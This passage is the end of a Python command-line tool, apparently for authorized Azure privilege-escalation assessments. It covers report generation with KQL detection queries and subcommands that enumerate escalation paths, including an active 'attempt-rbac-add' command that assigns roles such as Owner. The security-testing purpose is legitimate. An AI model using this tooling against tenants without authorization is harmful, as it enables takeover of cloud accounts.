            lines.append(f"\n**Evidence:**\n```json\n{json.dumps(f['evidence'], indent=2)}\n```")
        if f.get("recommendation"):
            lines.append(f"\n**Recommendation:** {f['recommendation']}")
        lines.append("")

    lines.append("\n## Detection Guidance\n")
    lines.append("| Finding | Azure Activity Log Event | KQL Query |")
    lines.append("|---------|--------------------------|-----------|")
    lines.append("| AZPE-001/002 | Microsoft.Authorization/roleAssignments/write | `AzureActivity \\| where OperationNameValue == 'MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE'` |")
    lines.append("| AZPE-004/005 | microsoft.directory/applications/credentials/update | `AuditLogs \\| where OperationName == 'Update application - Certificates and secrets management'` |")
    lines.append("| AZPE-008 | Microsoft.Automation/automationAccounts/runbooks/write | `AzureActivity \\| where ResourceProvider == 'MICROSOFT.AUTOMATION'` |")
    lines.append("| AZPE-011 | ElevateAccess | `AzureActivity \\| where OperationNameValue == 'MICROSOFT.AUTHORIZATION/ELEVATEACCESS/ACTION'` |")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        prog="agent.py",
        description="Azure Privilege Escalation — authorized penetration testing only"
    )
    parser.add_argument("--output", choices=["text", "json"], default="text")
    parser.add_argument("--subscription", help="Azure subscription ID (overrides current context)")
    parser.add_argument("--tenant", help="Azure tenant ID (overrides current context)")

    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("check", help="Run all escalation path checks (read-only)")

    p_rbac = sub.add_parser("rbac-paths", help="RBAC write / UAA / custom role wildcard paths")
    p_rbac.add_argument("--subscription")
    p_rbac.add_argument("--output", choices=["text", "json"], default="text")

    p_sp = sub.add_parser("sp-paths", help="Owned app registration SP privilege paths")
    p_sp.add_argument("--tenant")
    p_sp.add_argument("--output", choices=["text", "json"], default="text")

    p_id = sub.add_parser("identity-paths", help="VM/VMSS managed identity escalation paths")
    p_id.add_argument("--subscription")
    p_id.add_argument("--output", choices=["text", "json"], default="text")

    p_auto = sub.add_parser("automation-paths", help="Automation Account RunAs / managed identity paths")
    p_auto.add_argument("--subscription")
    p_auto.add_argument("--output", choices=["text", "json"], default="text")

    p_entra = sub.add_parser("entra-paths", help="Entra ID role-based escalation paths")
    p_entra.add_argument("--tenant")
    p_entra.add_argument("--output", choices=["text", "json"], default="text")

    p_attempt = sub.add_parser(
        "attempt-rbac-add",
        help="[ACTIVE] Create a role assignment (requires --confirm-authorized)"
    )
    p_attempt.add_argument("--confirm-authorized", metavar="AUTH-REF", required=True,
                           help="Pentest authorization reference (e.g. SOW-2026-042)")
    p_attempt.add_argument("--assignee", required=True, help="Principal ID or UPN to assign role to")
    p_attempt.add_argument("--role", required=True, help="Role name or GUID (e.g. Owner)")
    p_attempt.add_argument("--scope", help="Scope (defaults to current subscription)")

    p_report = sub.add_parser("report", help="Generate full escalation assessment report")
    p_report.add_argument("--format", dest="output", choices=["text", "json", "markdown"],
                          default="markdown")
    p_report.add_argument("--file", help="Write report to file")
    p_report.add_argument("--subscription")
    p_report.add_argument("--tenant")

    args = parser.parse_args()

    dispatch = {
        "check": cmd_check,
        "rbac-paths": cmd_rbac_paths,
        "sp-paths": cmd_sp_paths,
        "identity-paths": cmd_identity_paths,
        "automation-paths": cmd_automation_paths,
        "entra-paths": cmd_entra_paths,
        "attempt-rbac-add": cmd_attempt_rbac_add,
        "report": cmd_report,
    }

    handler = dispatch.get(args.command)
    if not handler:
        parser.print_help()
        return 1

    return handler(args)


if __name__ == "__main__":
    sys.exit(main())
